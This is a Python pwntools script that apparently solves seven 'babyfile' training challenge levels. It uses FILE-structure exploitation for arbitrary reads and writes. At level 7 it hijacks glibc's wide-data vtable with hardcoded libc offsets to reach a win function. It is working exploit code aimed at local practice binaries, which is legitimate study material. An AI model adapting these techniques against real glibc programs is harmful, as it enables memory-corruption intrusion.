#!/usr/bin/python3
from pwn import *

context.clear(arch='amd64')

def babyfile_level1():
    p = process('/challenge/babyfile_level1')

    file = FileStructure()
    payload = file.write(0x4040e0, 0x100)

    p.recvuntil(b'struct.')
    p.send(payload)
    p.interactive()

def babyfile_level2():
    p = process('/challenge/babyfile_level2')

    file = FileStructure()
    payload = file.read(0x004041f8, 0x120)

    p.recvuntil(b'struct.')
    p.send(payload)
    p.sendline(b'A'*0x110)
    p.interactive()

def babyfile_level3():
    p = process('/challenge/babyfile_level3')

    payload = p64(1)

    p.recvuntil(b'struct.')
    p.send(payload)
    p.interactive()

def babyfile_level4():
    p = process('/challenge/babyfile_level4')

    win = p64(0x401316)

    p.recvuntil(b'stored at: ')
    retaddr = int(p.recvline(), 16)

    file = FileStructure()
    payload = file.read(retaddr, 0x120)

    p.recvuntil(b'struct.')
    p.send(payload)
    p.send(win + p64(0)*0x120)
    p.interactive()

def babyfile_level5():
    p = process('/challenge/babyfile_level5')

    secret = 0x4040c0

    file = FileStructure()
    payload = file.write(secret, 0x1e0)

    p.recvuntil(b'struct.')
    p.send(payload)
    p.interactive()

def babyfile_level6():
    p = process('/challenge/babyfile_level6')

    file = FileStructure()
    payload = file.read(0x004041f8, 0x1e0)

    p.recvuntil(b'struct.')
    p.send(payload)
    p.sendline(b'A'*0x1e0)
    p.interactive()

def babyfile_level7():
#    p = gdb.debug('./babyfile_level7', '''
        #b *0x401a26             
        #b *fwrite+179
        #c
    #''')
    p = process('/challenge/babyfile_level7')
    win = p64(0x004012e6)

    print(p.recvuntil(b'libc is: '))
#    libc_base = int(p.recvline(), 16) - 0x80e50 #local
    libc_base = int(p.recvline(), 16) - 0x84420 #remote 
#    wfile_overflow = libc_base + 0x216018 #local - wfile_jumps_mmap ptr to wfile_overflow + 0x18
    wfile_overflow = libc_base + 0x1E8EB8 #remote - wfile_jumps_mmap ptr to wfile_overflow + 0x18
    print(f'wfile: {hex(wfile_overflow)}')

    print(p.recvuntil(b'located at: '))
    name_buffer = int(p.recvline(), 16)
    print(f'name at: {hex(name_buffer)}')

    file = FileStructure()
    file.flags = p64(0x0)
    file.vtable = p64(wfile_overflow - 0x38)  # fwrite offset
    file._wide_data = p64(name_buffer) # wide_data vtable pointer to point at name buff
    file._lock = p64(0x4041f8) #rw address containing 0

    #we're re-using this struct twice, once as a wide data struct
    # and then again as the wide_data struct's vtable.
    #The wide data struct's vtable is at offset 0xe0, so we put the name buffer there
    #to be reused as the vtable as well.
    #We can then put win at 0x68, as doallocbuf will make a call to whatever is there.
    # doallocate?
    wide_data_struct = b'\x00'*0x68 + win + b'\x00'*(0xe0-0x70) + p64(name_buffer)

    print(p.recvuntil(b'name.'))
    p.send(wide_data_struct)
    print(p.recvuntil(b'struct.'))
    p.send(bytes(file))
    p.interactive()

babyfile_level7()